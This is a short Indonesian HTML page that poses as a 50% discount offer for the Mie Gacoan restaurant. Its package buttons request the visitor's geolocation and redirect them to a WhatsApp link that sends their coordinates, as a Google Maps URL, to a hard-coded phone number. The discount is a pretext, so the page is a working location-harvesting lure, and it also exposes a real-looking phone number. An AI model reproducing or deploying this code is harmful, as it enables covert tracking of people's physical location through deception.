<html>
<head>
  <title>Kirim Lokasi ke WhatsApp</title>
  <style>
    body {
      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRdVQlwd8-Cm86aZRaS9MKzyvjWsNScdH8bp52XgIL3alvpVZlg0638x5g&s=10');
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
      color: #fff;
      text-align: center;
    }
    
    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }
    
    .judul {
      font-size: 36px;
      font-weight: bold;
      margin-bottom: 20px;
      background-color: rgba(0, 0, 0, 0.5);
      padding: 10px;
      border: 1px solid #000;
      color: #fff;
    }
    
    .tombol {
      background-color: #32CD32;
      color: #fff;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin: 10px;
    }
    
    .tombol:hover {
      background-color: #32CD32;
    }
    
    .paket-container {
      display: flex;
      justify-content: space-around;
    }
    
    .paket {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin: 10px;
      color: #fff;
    }
    
    .paket-a {
      background-color: rgba(255, 0, 0, 0.5);
    }
    
    .paket-b {
      background-color: #ADD8E6;
    }
    
    .paket-c {
      background-color: rgba(255, 0, 0, 0.5);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="judul">Diskon Mie Gacoan 50%</h1>
    <button id="aktifkan-lokasi" class="tombol">Aktifkan Lokasi</button>
    <div class="paket-container">
      <button id="paket-1" class="paket paket-a" onclick="aktifkanLokasi()">Paket A</button>
      <button id="paket-2" class="paket paket-b" onclick="aktifkanLokasi()">Paket B</button>
      <button id="paket-3" class="paket paket-c" onclick="aktifkanLokasi()">Paket C</button>
    </div>
  </div>
  <script>
    function aktifkanLokasi() {
      alert("apabila tidak bisa, maka Aktifkan Lokasi secara manual");
      navigator.geolocation.getCurrentPosition(showPosition);
    }
    
    document.getElementById("aktifkan-lokasi").addEventListener("click", function() {
      navigator.geolocation.getCurrentPosition(showPosition);
    });
    
    function showPosition(position) {
      var lat = position.coords.latitude;
      var lon = position.coords.longitude;
      var nomor = "+6289687956682"; // Ganti dengan nomor WhatsApp tujuan
      var link = "https://wa.me/" + nomor.replace(/[^0-9]/g, '') + "?text=gacoan%20diskon%20%20https://maps.google.com/?q=" + lat + "," + lon;
      window.location.href = link;
    }
  </script>
</body>
</html>

